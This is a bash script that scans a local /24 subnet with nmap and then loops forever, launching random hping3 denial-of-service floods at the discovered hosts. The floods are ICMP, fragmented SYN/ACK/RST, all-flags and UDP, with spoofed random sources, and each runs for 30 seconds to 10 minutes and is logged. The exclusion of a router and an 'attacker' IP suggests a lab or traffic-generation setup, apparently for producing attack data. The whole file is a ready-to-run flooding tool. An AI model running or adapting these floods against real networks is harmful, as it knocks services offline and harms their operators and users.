#!/bin/bash

me=$$

i=0


IPS=$(nmap -n -sn 192.168.200.0/24 -oG - | awk '/Up$/{print $2}') #replace the IP of the network!!

printf "\n !*!*!*!*!*!*!*!*! Starting actual DoS attacks for the following IPs:\n $IPS \n" 2>&1 | tee -a dos_output/dos_log.txt

arrIPS=($IPS)

arrDOS=("sudo hping3 -1 --flood --rand-source " "sudo hping3 -1 -C 3 -K 3 --flood --rand-source " "sudo hping3 -d 3000 --flood --frag -p 80 -S " "sudo hping3 --flood -d 3000 --frag --rand-source -p 80 -A " "sudo hping3 --flood -d 3000 --frag --rand-source -p 80 -R " "sudo hping3 --flood -d 3000 --rand-source -p 80 -F -S -R -P -A -U -X -Y " "sudo hping3 --flood --rand-source --udp --sign 'GosiaFlood' -p 80 ")

RANDOM=$$$(date +%s)

while true
do
    i=$((i+1))
    Random_IP=${arrIPS[$RANDOM % ${#arrIPS[@]} ]}
    Random_DOS=${arrDOS[$RANDOM % ${#arrDOS[@]} ]}

    if [ "$Random_IP" = "192.168.200.1" ]; then
        printf "$i) router\'s IP\n" 2>&1 | tee -a dos_output/dos_log.txt
    elif [ "$Random_IP" = "192.168.200.134" ]; then
        printf "$i) attacker\'s IP\n" 2>&1 | tee -a dos_output/dos_log.txt
    elif [ "$Random_IP" = "192.168.200.2" ]; then
        printf "$i) restricted IP\n" 2>&1 | tee -a dos_output/dos_log.txt
    elif [ "$Random_IP" = "192.168.200.3" ]; then
        printf "$i) restricted IP\n" 2>&1 | tee -a dos_output/dos_log.txt
    else
        start_current_time=$(date "+%Y.%m.%d-%H.%M.%S")
        printf "\n\n*** Executing $Random_DOS$Random_IP\n"
        printf $(eval $Random_DOS$Random_IP) & script1=$!
        printf "\n\n"
        Random_Time=$(shuf -i30-600 -n1) #from 30 sec to 10 minutes
        sleep $Random_Time
        kill $script1
        stop_current_time=$(date "+%Y.%m.%d-%H.%M.%S")
        printf "$i) start: $start_current_time , stop: $stop_current_time [$Random_Time] \' $Random_DOS$Random_IP \' \n" 2>&1 | tee -a dos_output/dos_log.txt
    fi
done





